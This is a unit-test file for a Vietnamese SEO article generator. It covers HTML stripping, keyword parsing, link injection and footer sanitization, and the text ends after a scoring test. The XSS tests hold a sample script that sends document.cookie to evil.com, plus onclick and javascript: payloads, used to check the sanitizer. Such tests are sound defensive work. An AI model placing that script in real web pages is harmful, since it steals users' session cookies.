/**
 * Unit Tests — /viet-tu-google-search
 *
 * Runner: tsx --test (Node.js built-in test runner)
 * Run:    cd web && npm test
 *
 * Bug summary (xem FIX-VIET-TU-GOOGLE-SEARCH.md để fix):
 *   #1 prompt-builder.ts có SEO_PROMPT_RULES local 10 rules (EN)  → nên import shared 23 rules (VI)
 *   #2 parseKeywords regex strips leading digit từ keyword phrase  → regex quá rộng
 *   #3 relatedKeywords không dedup                                 → duplicate fragments
 *   #4 applySeoAdvanced tạo nested <a> khi keyword đã trong <a>   → regex không kiểm tra context
 *   #5 footerContent inject không sanitize                         → XSS risk
 *   #6 extractTitle không decode HTML entities từ H1              → title bị encoded
 *   #7 fallbackKeywords hardcode năm 2026                         → sai khi sang năm mới
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

// =============================================================================
// COPY PURE FUNCTIONS TỪ SOURCE (không export nên copy vào để test trong Node)
// =============================================================================

// ─── FROM: app/api/viet-tu-google-search/search/route.ts ─────────────────────

function stripHtmlSearch(html: string): string {
  return html
    .replace(/<script[\s\S]*?<\/script>/gi, ' ')
    .replace(/<style[\s\S]*?<\/style>/gi, ' ')
    .replace(/<nav[\s\S]*?<\/nav>/gi, ' ')
    .replace(/<footer[\s\S]*?<\/footer>/gi, ' ')
    .replace(/<header[\s\S]*?<\/header>/gi, ' ')
    .replace(/<aside[\s\S]*?<\/aside>/gi, ' ')
    .replace(/<[^>]+>/g, ' ')
    .replace(/&nbsp;/gi, ' ')
    .replace(/&amp;/gi, '&')
    .replace(/\s+/g, ' ')
    .trim();
}

function countWordsSearch(text: string): number {
  return text.split(/\s+/).filter(Boolean).length;
}

type CrawlMode = 'auto' | 'search_only' | 'no_crawl';
interface SearchSource {
  url: string;
  title: string;
  snippet: string;
  content: string | null;
  crawled: boolean;
  wordCount: number;
}

function synthesize(keyword: string, sources: SearchSource[], crawlMode: CrawlMode): string {
  if (!sources.length) {
    return `No search sources were found for "${keyword}". Use general SEO knowledge and avoid fresh claims.`;
  }

  const crawledCount = sources.filter((source) => source.crawled).length;
  const details = sources
    .map((source, index) => {
      const basis = source.content || source.snippet;
      return `${index + 1}. ${source.title}: ${basis.slice(0, 260)}`;
    })
    .join('\n');

  return [
    `Keyword: ${keyword}`,
    `Mode: ${crawlMode}. Sources: ${sources.length}. Crawled: ${crawledCount}.`,
    'Use these angles and facts as reference, but write an original article:',
    details,
  ].join('\n');
}

// BUG #3: relatedKeywords extraction (từ search/route.ts line 190–193)
// Không dedup — có thể trả về các fragment giống nhau
function relatedKeywordsBuggy(sources: SearchSource[]): string[] {
  return sources
    .flatMap((source) => source.title.split(/[|:-]/).map((part) => part.trim()))
    .filter((part) => part.length > 4)
    .slice(0, 8);
}

// FIX #3: relatedKeywords với dedup + lowercase normalization
function relatedKeywordsFixed(sources: SearchSource[]): string[] {
  const seen = new Set<string>();
  return sources
    .flatMap((source) => source.title.split(/[|:-]/).map((part) => part.trim()))
    .filter((part) => {
      if (part.length <= 4) return false;
      const key = part.toLowerCase();
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    })
    .slice(0, 8);
}

// ─── FROM: app/api/viet-tu-google-search/stream/route.ts ─────────────────────

function chunkText(value: string, size = 900): string[] {
  const chunks: string[] = [];
  for (let index = 0; index < value.length; index += size) {
    chunks.push(value.slice(index, index + size));
  }
  return chunks;
}

function extractTitle(html: string, fallback: string): string {
  const match = html.match(/<h1[^>]*>([\s\S]*?)<\/h1>/i);
  return (match?.[1]?.replace(/<[^>]+>/g, '').trim() || fallback).slice(0, 500);
}

// FIX #6: extractTitle với HTML entity decoding
function extractTitleFixed(html: string, fallback: string): string {
  const match = html.match(/<h1[^>]*>([\s\S]*?)<\/h1>/i);
  const raw = match?.[1]?.replace(/<[^>]+>/g, '').trim() || fallback;
  return raw
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&nbsp;/g, ' ')
    .slice(0, 500);
}

interface VtgsSeoAdvancedState {
  mainLink: string;
  keywordLinks: string;
  autoBold: 'none' | 'keyword' | 'both';
  footerContent: string;
  customSlug: string;
  noIndex: boolean;
  focusKeyphrase: string;
  enableFeaturedSnippet: boolean;
}

interface VtgsConfigMinimal {
  keyword: string;
  secondaryKeywords: string[];
  seoAdvanced: VtgsSeoAdvancedState;
  brand: { brandForbidden?: string; ctaStandard?: string };
}

function stripHtmlSimple(html: string): string {
  return html.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
}

// BUG #4: applySeoAdvanced mainLink pattern (từ stream/route.ts line 87–88)
// Pattern `>[^<]*?KEYWORD[^<]*?<` sẽ match keyword inside existing <a> content
// vì sau `<a href="...">` vẫn có `>`, và trước `</a>` vẫn có `<`
function applySeoAdvanced(html: string, config: VtgsConfigMinimal): string {
  let nextHtml = html;
  const keyword = config.keyword.trim();
  const { mainLink, keywordLinks, autoBold, footerContent } = config.seoAdvanced;

  if (keyword && mainLink.trim()) {
    const pattern = new RegExp(`(>[^<]*?)(${keyword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})([^<]*?<)`, 'i');
    nextHtml = nextHtml.replace(pattern, `$1<a href="${mainLink.trim()}">$2</a>$3`);
  }

  if (keywordLinks.trim()) {
    const links = keywordLinks
      .split(/\n+/)
      .map((line) => line.split('|').map((part) => part.trim()))
      .filter((parts): parts is [string, string] => parts.length >= 2 && Boolean(parts[0]) && /^https?:\/\//i.test(parts[1]));

    for (const [linkKeyword, url] of links) {
      const pattern = new RegExp(`(>[^<]*?)(${linkKeyword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})([^<]*?<)`, 'i');
      nextHtml = nextHtml.replace(pattern, `$1<a href="${url}">$2</a>$3`);
    }
  }

  if (keyword && (autoBold === 'keyword' || autoBold === 'both')) {
    const pattern = new RegExp(`(>[^<]*?)(${keyword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})([^<]*?<)`, 'i');
    nextHtml = nextHtml.replace(pattern, `$1<strong>$2</strong>$3`);
  }

  // BUG #5: footerContent inject không sanitize — XSS risk
  if (footerContent.trim()) {
    nextHtml = nextHtml.replace(/<\/article>\s*$/i, `<section class="brand-footer">${footerContent.trim()}</section></article>`);
  }

  return nextHtml;
}

// FIX #4 + #5: applySeoAdvanced đúng — dùng split-on-tags, sanitize footerContent
function escapeRegExp(v: string): string {
  return v.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function replaceFirstInTextNode(html: string, keyword: string, buildReplacement: (m: string) => string): string {
  const pattern = new RegExp(`(${escapeRegExp(keyword)})`, 'i');
  let replaced = false;
  return html.split(/(<[^>]+>)/g).map((part) => {
    if (replaced || part.startsWith('<') || !pattern.test(part)) return part;
    replaced = true;
    return part.replace(pattern, (m) => buildReplacement(m));
  }).join('');
}

function sanitizeFooterContent(raw: string): string {
  return raw
    .replace(/<script[\s\S]*?<\/script>/gi, '')
    .replace(/\bon\w+\s*=/gi, 'data-blocked=')
    .replace(/javascript\s*:/gi, '#');
}

function applySeoAdvancedFixed(html: string, config: VtgsConfigMinimal): string {
  let nextHtml = html;
  const keyword = config.keyword.trim();
  const { mainLink, keywordLinks, autoBold, footerContent } = config.seoAdvanced;

  if (keyword && mainLink.trim()) {
    nextHtml = replaceFirstInTextNode(nextHtml, keyword, (m) => `<a href="${mainLink.trim()}">${m}</a>`);
  }

  if (keywordLinks.trim()) {
    const links = keywordLinks
      .split(/\n+/)
      .map((line) => line.split('|').map((part) => part.trim()))
      .filter((parts): parts is [string, string] => parts.length >= 2 && Boolean(parts[0]) && /^https?:\/\//i.test(parts[1]));

    for (const [linkKeyword, url] of links) {
      nextHtml = replaceFirstInTextNode(nextHtml, linkKeyword, (m) => `<a href="${url}">${m}</a>`);
    }
  }

  if (keyword && (autoBold === 'keyword' || autoBold === 'both')) {
    nextHtml = replaceFirstInTextNode(nextHtml, keyword, (m) => `<strong>${m}</strong>`);
  }

  if (footerContent.trim()) {
    const safe = sanitizeFooterContent(footerContent.trim());
    nextHtml = nextHtml.replace(/<\/article>\s*$/i, `<section class="brand-footer">${safe}</section></article>`);
  }

  return nextHtml;
}

function scoreHumanness(html: string, brandForbidden = '') {
  const text = stripHtmlSimple(html);
  const words = text.split(/\s+/).filter(Boolean);
  const sentences = text.split(/[.!?]+/).filter((item) => item.trim().length > 8);
  const avgSentence = sentences.length ? words.length / sentences.length : 0;
  const longParagraphs = (html.match(/<p[\s\S]*?<\/p>/gi) || []).filter((paragraph) => countWordsSearch(paragraph) > 90).length;
  const forbiddenFound = brandForbidden
    .split(',')
    .map((item) => item.trim())
    .filter((item) => item && text.toLowerCase().includes(item.toLowerCase()));
  const issues = [
    avgSentence > 25 ? 'Cau hoi dai, nen cat ngan de doc mobile tot hon.' : '',
    longParagraphs > 0 ? `${longParagraphs} doan hoi dai.` : '',
    forbiddenFound.length ? 'Co tu/cum tu trong danh sach tranh dung.' : '',
  ].filter(Boolean);
  const score = Math.max(55, Math.min(94, 88 - longParagraphs * 4 - forbiddenFound.length * 6 - (avgSentence > 25 ? 6 : 0)));
  const decision = score >= 76 ? 'PUBLISH' : score >= 60 ? 'REVIEW' : 'REWRITE';

  return {
    score,
    decision,
    issues,
    forbiddenFound,
    scoreBreakdown: {
      language_natural: Math.min(25, Math.max(10, Math.round(score * 0.25))),
      structure: Math.min(25, Math.max(10, Math.round(score * 0.25))),
      eeat_signals: Math.min(25, Math.max(10, Math.round(score * 0.24))),
      engagement: Math.min(25, Math.max(10, Math.round(score * 0.26))),
    },
  } as const;
}

// ─── FROM: app/api/viet-tu-google-search/suggest-keywords/route.ts ────────────

function fallbackKeywords(keyword: string, count: number): string[] {
  const base = keyword.trim();
  return [
    `${base} la gi`,
    `cach chon ${base}`,
    `${base} tot nhat`,
    `${base} gia bao nhieu`,
    `${base} uu nhuoc diem`,
    `${base} kinh nghiem mua`,
    `${base} so sanh`,
    `${base} 2026`,           // BUG #7: hardcoded year
    `${base} cho gia dinh`,
    `${base} gan day`,
  ].slice(0, count);
}

// FIX #7: fallbackKeywords với dynamic year
function fallbackKeywordsFixed(keyword: string, count: number): string[] {
  const base = keyword.trim();
  const currentYear = new Date().getFullYear();
  return [
    `${base} la gi`,
    `cach chon ${base}`,
    `${base} tot nhat`,
    `${base} gia bao nhieu`,
    `${base} uu nhuoc diem`,
    `${base} kinh nghiem mua`,
    `${base} so sanh`,
    `${base} ${currentYear}`,
    `${base} cho gia dinh`,
    `${base} gan day`,
  ].slice(0, count);
}

// BUG #2: parseKeywords regex `^[-*\d.\s]+` strips leading digit from keyword phrases
// Ví dụ: "5 cach chon ghe" → "cach chon ghe" (bị mất số "5")
function parseKeywords(raw: string, count: number): string[] {
  return raw
    .split(/\n|,|;/)
    .map((item) => item.replace(/^[-*\d.\s]+/, '').trim())
    .filter(Boolean)
    .filter((item, index, arr) => arr.findIndex((other) => other.toLowerCase() === item.toLowerCase()) === index)
    .slice(0, count);
}

// FIX #2: parseKeywords với regex chỉ strip list marker thực sự (bullet hoặc số+dấu chấm/ngoặc)
function parseKeywordsFixed(raw: string, count: number): string[] {
  return raw
    .split(/\n|,|;/)
    .map((item) => item.replace(/^(?:[-*]\s+|\d+[.)]\s+)/, '').trim())
    .filter((item) => item.length >= 2)
    .filter((item, index, arr) => arr.findIndex((other) => other.toLowerCase() === item.toLowerCase()) === index)
    .slice(0, count);
}

// ─── FROM: app/api/viet-tu-google-search/outline/route.ts ─────────────────────

function fallbackOutline(keyword: string): string {
  const kw = keyword || 'chu de';
  return [
    `[h2] Tong quan ve ${kw}`,
    `[h3] ${kw} la gi va khi nao nen quan tam`,
    `[h2] Nhu cau tim kiem va cac tieu chi quan trong`,
    `[h3] Tieu chi chon lua theo ngan sach va muc dich`,
    `[h2] So sanh cac lua chon pho bien`,
    `[h3] Uu diem, han che va tinh huong nen dung`,
    `[h2] Kinh nghiem thuc te khi ap dung ${kw}`,
    `[h3] Loi thuong gap va cach tranh`,
    `[h2] Cau hoi thuong gap ve ${kw}`,
    `[h2] Ket luan va goi y hanh dong`,
  ].join('\n');
}

// ─── MINIMAL CONFIG FACTORY ───────────────────────────────────────────────────

function makeSeoAdvanced(overrides: Partial<VtgsSeoAdvancedState> = {}): VtgsSeoAdvancedState {
  return {
    mainLink: '',
    keywordLinks: '',
    autoBold: 'none',
    footerContent: '',
    customSlug: '',
    noIndex: false,
    focusKeyphrase: '',
    enableFeaturedSnippet: false,
    ...overrides,
  };
}

function makeConfig(keyword: string, overrides: Partial<VtgsConfigMinimal> = {}): VtgsConfigMinimal {
  return {
    keyword,
    secondaryKeywords: [],
    seoAdvanced: makeSeoAdvanced(),
    brand: {},
    ...overrides,
  };
}

function makeSource(overrides: Partial<SearchSource> = {}): SearchSource {
  return {
    url: 'https://example.com',
    title: 'Example Title',
    snippet: 'Short snippet.',
    content: null,
    crawled: false,
    wordCount: 10,
    ...overrides,
  };
}

// =============================================================================
// TESTS
// =============================================================================

// ─── stripHtml (search/route.ts) ─────────────────────────────────────────────

describe('stripHtml [search/route.ts]', () => {
  it('removes basic HTML tags', () => {
    assert.equal(stripHtmlSearch('<p>Hello world</p>'), 'Hello world');
  });

  it('removes script blocks entirely', () => {
    const result = stripHtmlSearch('<script>alert(1)</script><p>content</p>');
    assert.ok(!result.includes('alert'), 'script content must be removed');
    assert.ok(result.includes('content'));
  });

  it('removes style blocks', () => {
    const result = stripHtmlSearch('<style>.a{color:red}</style><p>text</p>');
    assert.ok(!result.includes('color'), 'style content must be removed');
  });

  it('removes nav/header/footer/aside blocks', () => {
    const html = '<nav>nav</nav><header>hdr</header><aside>side</aside><footer>ftr</footer><p>body</p>';
    const result = stripHtmlSearch(html);
    assert.ok(!result.includes('nav'), 'nav removed');
    assert.ok(!result.includes('hdr'), 'header removed');
    assert.ok(!result.includes('side'), 'aside removed');
    assert.ok(!result.includes('ftr'), 'footer removed');
    assert.ok(result.includes('body'));
  });

  it('decodes &nbsp; and &amp;', () => {
    assert.ok(stripHtmlSearch('<p>a&amp;b&nbsp;c</p>').includes('a&b'));
    assert.ok(stripHtmlSearch('<p>a&nbsp;b</p>').includes('a b'));
  });

  it('collapses multiple spaces', () => {
    const result = stripHtmlSearch('<p>  too   many   spaces  </p>');
    assert.ok(!result.includes('  '));
  });

  it('empty string → empty string', () => {
    assert.equal(stripHtmlSearch(''), '');
  });

  it('plain text unchanged (no tags)', () => {
    assert.equal(stripHtmlSearch('plain text'), 'plain text');
  });
});

// ─── countWords (search/route.ts) ────────────────────────────────────────────

describe('countWords [search/route.ts]', () => {
  it('counts space-separated words', () => {
    assert.equal(countWordsSearch('hello world foo'), 3);
  });

  it('empty string → 0', () => {
    assert.equal(countWordsSearch(''), 0);
  });

  it('multiple spaces → single word count', () => {
    assert.equal(countWordsSearch('  one   two  '), 2);
  });

  it('single word → 1', () => {
    assert.equal(countWordsSearch('single'), 1);
  });

  // NOTE: countWords trong search/route.ts được gọi với HTML string tại line 176:
  // wordCount: countWords(text) — nhưng `text` = content || snippet, đây là plain text
  // Tuy nhiên nếu vô tình gọi với HTML, sẽ đếm sai (tags = words)
  it('[DESIGN NOTE] HTML tags counted as words — caller must stripHtml first', () => {
    const countWithTags = countWordsSearch('<p>hello</p>');
    assert.ok(countWithTags > 1, 'tags counted as extra words: ' + countWithTags);
  });
});

// ─── synthesize (search/route.ts) ────────────────────────────────────────────

describe('synthesize [search/route.ts]', () => {
  it('no sources → returns "no sources" message', () => {
    const result = synthesize('giường sắt', [], 'auto');
    assert.ok(result.includes('No search sources were found'));
    assert.ok(result.includes('giường sắt'));
  });

  it('includes keyword in synthesis header', () => {
    const sources = [makeSource({ title: 'Article A', snippet: 'Snippet A', content: null })];
    const result = synthesize('tủ quần áo', sources, 'search_only');
    assert.ok(result.includes('Keyword: tủ quần áo'));
  });

  it('reports crawlMode and source count', () => {
    const sources = [makeSource({ content: 'Crawled content', crawled: true })];
    const result = synthesize('bàn ghế', sources, 'auto');
    assert.ok(result.includes('Mode: auto'));
    assert.ok(result.includes('Sources: 1'));
    assert.ok(result.includes('Crawled: 1'));
  });

  it('uses snippet when content is null', () => {
    const sources = [makeSource({ title: 'T', snippet: 'My snippet text', content: null, crawled: false })];
    const result = synthesize('keyword', sources, 'search_only');
    assert.ok(result.includes('My snippet text'));
  });

  it('uses content over snippet when available', () => {
    const sources = [makeSource({ title: 'T', snippet: 'Snippet', content: 'Full content text', crawled: true })];
    const result = synthesize('keyword', sources, 'auto');
    assert.ok(result.includes('Full content text'));
    assert.ok(!result.includes('Snippet'));
  });

  it('truncates source basis at 260 chars', () => {
    const longContent = 'x'.repeat(500);
    const sources = [makeSource({ title: 'T', content: longContent, crawled: true })];
    const result = synthesize('keyword', sources, 'auto');
    const lines = result.split('\n');
    const sourceLine = lines.find((l) => l.startsWith('1.'));
    assert.ok(sourceLine, 'source line must exist');
    assert.ok(sourceLine!.length < 400, 'source line must not include full 500-char content');
  });

  it('multiple sources → numbered list', () => {
    const sources = [
      makeSource({ title: 'A', snippet: 'S1', content: null }),
      makeSource({ title: 'B', snippet: 'S2', content: null }),
      makeSource({ title: 'C', snippet: 'S3', content: null }),
    ];
    const result = synthesize('keyword', sources, 'search_only');
    assert.ok(result.includes('1. A:'));
    assert.ok(result.includes('2. B:'));
    assert.ok(result.includes('3. C:'));
  });

  it('no_crawl mode with no sources → empty-sources message', () => {
    const result = synthesize('keyword', [], 'no_crawl');
    assert.ok(result.includes('No search sources were found'));
  });
});

// ─── relatedKeywords [BUG #3] ─────────────────────────────────────────────────

describe('[BUG #3] relatedKeywords — no deduplication in search/route.ts', () => {
  it('[BUG] duplicates appear when titles share same fragment', () => {
    const sources = [
      makeSource({ title: 'Giường sắt | Mua giường sắt' }),
      makeSource({ title: 'Bán giường sắt | Giá tốt' }),
    ];
    const result = relatedKeywordsBuggy(sources);
    const lowerAll = result.map((r) => r.toLowerCase());
    // "Giường sắt" (từ source 1) và "giường sắt" (từ source 2 sau lowercase) là same item
    const dupes = lowerAll.filter((item, i) => lowerAll.indexOf(item) !== i);
    assert.ok(dupes.length > 0, `BUG: got ${dupes.length} duplicates from relatedKeywordsBuggy`);
  });

  it('[FIX] fixed version deduplicates correctly', () => {
    const sources = [
      makeSource({ title: 'Giường sắt | Mua giường sắt' }),
      makeSource({ title: 'Bán giường sắt | Giá tốt' }),
    ];
    const result = relatedKeywordsFixed(sources);
    const lowerAll = result.map((r) => r.toLowerCase());
    const dupes = lowerAll.filter((item, i) => lowerAll.indexOf(item) !== i);
    assert.equal(dupes.length, 0, 'fixed: no duplicates');
  });

  it('filters fragments <= 4 chars', () => {
    const sources = [makeSource({ title: 'OK | ab | Good Title' })];
    const result = relatedKeywordsBuggy(sources);
    assert.ok(!result.includes('ab'), 'short fragment filtered');
    assert.ok(result.includes('Good Title'), 'long fragment kept');
  });

  it('caps at 8 results', () => {
    const sources = Array.from({ length: 5 }, (_, i) =>
      makeSource({ title: `Alpha${i} | Beta${i} | Gamma${i}` }),
    );
    const result = relatedKeywordsBuggy(sources);
    assert.ok(result.length <= 8, 'capped at 8');
  });
});

// ─── chunkText (stream/route.ts) ─────────────────────────────────────────────

describe('chunkText [stream/route.ts]', () => {
  it('empty string → []', () => {
    assert.deepEqual(chunkText(''), []);
  });

  it('string shorter than chunk size → single chunk', () => {
    const result = chunkText('hello', 900);
    assert.deepEqual(result, ['hello']);
  });

  it('splits into chunks of given size', () => {
    const text = 'a'.repeat(2700);
    const chunks = chunkText(text, 900);
    assert.equal(chunks.length, 3);
    assert.ok(chunks.every((c) => c.length === 900));
  });

  it('last chunk may be shorter', () => {
    const text = 'a'.repeat(1000);
    const chunks = chunkText(text, 900);
    assert.equal(chunks.length, 2);
    assert.equal(chunks[0].length, 900);
    assert.equal(chunks[1].length, 100);
  });

  it('default chunk size is 900', () => {
    const text = 'x'.repeat(1000);
    const chunks = chunkText(text);
    assert.equal(chunks[0].length, 900);
  });

  it('reassembling chunks gives original', () => {
    const text = 'abcdefghij'.repeat(200);
    assert.equal(chunkText(text, 300).join(''), text);
  });
});

// ─── extractTitle (stream/route.ts) ──────────────────────────────────────────

describe('extractTitle [stream/route.ts]', () => {
  it('extracts plain text from H1', () => {
    assert.equal(extractTitle('<h1>Giường sắt đơn</h1><p>content</p>', 'fallback'), 'Giường sắt đơn');
  });

  it('strips inner tags from H1', () => {
    assert.equal(extractTitle('<h1><strong>Giường</strong> sắt đơn</h1>', 'fallback'), 'Giường sắt đơn');
  });

  it('uses fallback when no H1', () => {
    assert.equal(extractTitle('<p>no heading</p>', 'Fallback Title'), 'Fallback Title');
  });

  it('case-insensitive H1 match', () => {
    assert.equal(extractTitle('<H1>Title Here</H1>', 'fallback'), 'Title Here');
  });

  it('H1 with attributes', () => {
    assert.equal(extractTitle('<h1 class="main-title">Tủ quần áo</h1>', 'fallback'), 'Tủ quần áo');
  });

  it('truncates at 500 chars', () => {
    const long = 'a'.repeat(600);
    const result = extractTitle(`<h1>${long}</h1>`, 'fallback');
    assert.equal(result.length, 500);
  });

  // BUG #6: HTML entities không được decode
  it('[BUG #6] HTML entities NOT decoded in H1 — title stored with encoded chars', () => {
    const result = extractTitle('<h1>Nội thất &amp; Đồ gỗ</h1>', 'fallback');
    // Buggy: &amp; not decoded → title contains literal "&amp;" instead of "&"
    assert.ok(result.includes('&amp;'), 'BUG #6 confirmed: entity not decoded, &amp; literal in title');
    // The decoded (correct) form should NOT equal the buggy output
    assert.notEqual(result, 'Nội thất & Đồ gỗ', 'buggy: title is not the properly decoded string');
  });

  it('[FIX #6] extractTitleFixed decodes HTML entities correctly', () => {
    const result = extractTitleFixed('<h1>Nội thất &amp; Đồ gỗ</h1>', 'fallback');
    assert.equal(result, 'Nội thất & Đồ gỗ');
    assert.ok(!result.includes('&amp;'), 'entity decoded to &');
  });

  it('[FIX #6] decodes &lt; &gt; &quot; &#39;', () => {
    assert.equal(extractTitleFixed('<h1>&lt;b&gt; &quot;test&quot; &#39;x&#39;</h1>', 'fb'), '<b> "test" \'x\'');
  });

  it('[FIX #6] &nbsp; decoded to space', () => {
    const result = extractTitleFixed('<h1>a&nbsp;b</h1>', 'fb');
    assert.equal(result, 'a b');
  });
});

// ─── applySeoAdvanced [BUG #4, #5] (stream/route.ts) ─────────────────────────

describe('applySeoAdvanced [stream/route.ts]', () => {
  it('no-op when seoAdvanced all blank', () => {
    const html = '<article><h1>title</h1><p>giường sắt đơn</p></article>';
    const result = applySeoAdvanced(html, makeConfig('giường sắt đơn'));
    assert.equal(result, html);
  });

  it('mainLink wraps first keyword occurrence in <a>', () => {
    const html = '<article><h1>Giường sắt</h1><p>giường sắt đơn</p></article>';
    const config = makeConfig('giường sắt', { seoAdvanced: makeSeoAdvanced({ mainLink: 'https://example.com/giuong-sat' }) });
    const result = applySeoAdvanced(html, config);
    assert.ok(result.includes('<a href="https://example.com/giuong-sat">giường sắt</a>'), 'mainLink injected');
  });

  it('mainLink only applied once (no global flag)', () => {
    const html = '<article><p>giường sắt và giường sắt</p></article>';
    const config = makeConfig('giường sắt', { seoAdvanced: makeSeoAdvanced({ mainLink: 'https://example.com/' }) });
    const result = applySeoAdvanced(html, config);
    assert.equal((result.match(/<a href=/g) ?? []).length, 1, 'only one link injected');
  });

  it('autoBold wraps first keyword in <strong>', () => {
    const html = '<article><p>giường sắt đơn tốt nhất</p></article>';
    const config = makeConfig('giường sắt đơn', { seoAdvanced: makeSeoAdvanced({ autoBold: 'keyword' }) });
    const result = applySeoAdvanced(html, config);
    assert.ok(result.includes('<strong>giường sắt đơn</strong>'));
  });

  it('keywordLinks wraps secondary keyword in <a>', () => {
    const html = '<article><p>mua tủ quần áo giá rẻ</p></article>';
    const config = makeConfig('tủ', {
      seoAdvanced: makeSeoAdvanced({
        keywordLinks: 'tủ quần áo | https://example.com/tu',
      }),
    });
    const result = applySeoAdvanced(html, config);
    assert.ok(result.includes('href="https://example.com/tu"'));
  });

  it('keywordLinks ignores lines without https:// URL', () => {
    const html = '<article><p>tủ quần áo</p></article>';
    const config = makeConfig('tủ', {
      seoAdvanced: makeSeoAdvanced({ keywordLinks: 'tủ quần áo | /relative-url' }),
    });
    const result = applySeoAdvanced(html, config);
    assert.ok(!result.includes('<a href'), 'relative URL filtered out');
  });

  it('footerContent appended before </article>', () => {
    const html = '<article><p>content</p></article>';
    const config = makeConfig('keyword', {
      seoAdvanced: makeSeoAdvanced({ footerContent: '<p>CTA footer</p>' }),
    });
    const result = applySeoAdvanced(html, config);
    assert.ok(result.includes('<section class="brand-footer">'));
    assert.ok(result.includes('<p>CTA footer</p>'));
    assert.ok(result.endsWith('</article>'));
  });

  // BUG #4: Pattern tạo nested <a> khi keyword đã trong <a>
  it('[BUG #4] mainLink creates nested <a> when keyword already inside existing <a>', () => {
    // HTML có keyword đã được wrap trong <a> (link sản phẩm từ AI)
    const html = '<article><a href="/product">giường sắt đơn</a></article>';
    const config = makeConfig('giường sắt đơn', {
      seoAdvanced: makeSeoAdvanced({ mainLink: 'https://shop.com/' }),
    });
    const result = applySeoAdvanced(html, config);
    // BUG: pattern `>[^<]*?keyword[^<]*?<` match text node "giường sắt đơn" giữa > và <
    // tạo: <a href="/product"><a href="https://shop.com/">giường sắt đơn</a></a>
    const nestedA = (result.match(/<a [^>]+><a [^>]+>/g) ?? []).length;
    assert.ok(nestedA > 0, `BUG #4 confirmed: nested <a> tags found: ${result.substring(0, 200)}`);
  });

  it('[FIX #4] fixed version does NOT create nested <a>', () => {
    const html = '<article><a href="/product">giường sắt đơn</a></article>';
    const config = makeConfig('giường sắt đơn', {
      seoAdvanced: makeSeoAdvanced({ mainLink: 'https://shop.com/' }),
    });
    const result = applySeoAdvancedFixed(html, config);
    const nestedA = (result.match(/<a [^>]+><a [^>]+>/g) ?? []).length;
    assert.equal(nestedA, 0, 'fixed: no nested <a> tags');
  });

  // BUG #5: footerContent không sanitize
  it('[BUG #5] footerContent <script> injected unsanitized', () => {
    const html = '<article><p>text</p></article>';
    const maliciousFooter = '<script>fetch("https://evil.com/"+document.cookie)</script><p>CTA</p>';
    const config = makeConfig('keyword', {
      seoAdvanced: makeSeoAdvanced({ footerContent: maliciousFooter }),
    });
    const result = applySeoAdvanced(html, config);
    assert.ok(result.includes('<script>'), 'BUG #5 confirmed: script tag injected');
  });

  it('[FIX #5] fixed version sanitizes <script> from footerContent', () => {
    const html = '<article><p>text</p></article>';
    const maliciousFooter = '<script>fetch("https://evil.com/"+document.cookie)</script><p>CTA</p>';
    const config = makeConfig('keyword', {
      seoAdvanced: makeSeoAdvanced({ footerContent: maliciousFooter }),
    });
    const result = applySeoAdvancedFixed(html, config);
    assert.ok(!result.includes('<script>'), 'fixed: script stripped');
    assert.ok(result.includes('<p>CTA</p>'), 'safe content preserved');
  });

  it('[FIX #5] fixed version sanitizes onclick event handler', () => {
    const html = '<article><p>text</p></article>';
    const footer = '<button onclick="alert(1)">Click</button>';
    const config = makeConfig('keyword', {
      seoAdvanced: makeSeoAdvanced({ footerContent: footer }),
    });
    const result = applySeoAdvancedFixed(html, config);
    assert.ok(!result.includes('onclick='), 'onclick handler stripped');
  });

  it('[FIX #5] fixed version sanitizes javascript: URI', () => {
    const html = '<article><p>text</p></article>';
    const footer = '<a href="javascript:alert(1)">click</a>';
    const config = makeConfig('keyword', {
      seoAdvanced: makeSeoAdvanced({ footerContent: footer }),
    });
    const result = applySeoAdvancedFixed(html, config);
    assert.ok(!result.includes('javascript:'), 'javascript: URI stripped');
  });

  it('no article tag → footerContent not injected (no crash)', () => {
    const html = '<div><p>no article</p></div>';
    const config = makeConfig('keyword', {
      seoAdvanced: makeSeoAdvanced({ footerContent: '<p>CTA</p>' }),
    });
    const result = applySeoAdvanced(html, config);
    assert.ok(!result.includes('brand-footer'), 'footer not injected when no </article>');
  });

  it('empty keyword → mainLink not injected', () => {
    const html = '<article><p>content</p></article>';
    const config = makeConfig('  ', { seoAdvanced: makeSeoAdvanced({ mainLink: 'https://ex.com' }) });
    const result = applySeoAdvanced(html, config);
    assert.ok(!result.includes('<a href'), 'no link when keyword empty');
  });
});

// ─── scoreHumanness (stream/route.ts) ────────────────────────────────────────

describe('scoreHumanness [stream/route.ts]', () => {
  const shortArticle = '<p>Giường sắt đơn là lựa chọn tốt. Giá rẻ, bền đẹp.</p>';

  it('score always between 55 and 94 (clamped)', () => {
    const result = scoreHumanness(shortArticle);
    assert.ok(result.score >= 55, `score ${result.score} < 55`);
    assert.ok(result.score <= 94, `score ${result.score} > 94`);
  });

  it('clean short article scores high (88)', () => {
    const result = scoreHumanness(shortArticle);
    assert.equal(result.score, 88, 'clean article should score 88 baseline');
  });

  it('decision PUBLISH when score >= 76', () => {
    assert.equal(scoreHumanness(shortArticle).decision, 'PUBLISH');
  });

  it('forbidden word decreases score by 6', () => {
    const article = '<p>Sản phẩm vô cùng tốt cho bạn và gia đình của bạn.</p>';
    const result = scoreHumanness(article, 'vô cùng');
    assert.equal(result.score, 82, '88 - 6 = 82 for one forbidden word');
    assert.deepEqual(result.forbiddenFound, ['vô cùng']);
  });

  it('multiple forbidden words each deduct 6', () => {
    const article = '<p>Hiệu quả và quan trọng lắm.</p>';
    const result = scoreHumanness(article, 'hiệu quả,quan trọng');
    assert.equal(result.score, 76, '88 - 12 = 76 for two forbidden words');
  });

  it('long paragraph deducts 4 per paragraph > 90 words', () => {
    // Build a paragraph with 91 words
    const words = Array.from({ length: 91 }, (_, i) => `word${i}`).join(' ');
    const html = `<p>${words}</p>`;
    const result = scoreHumanness(html);
    assert.equal(result.score, 84, '88 - 4 = 84 for one long paragraph');
    assert.ok(result.issues.some((i) => i.includes('doan hoi dai')));
  });

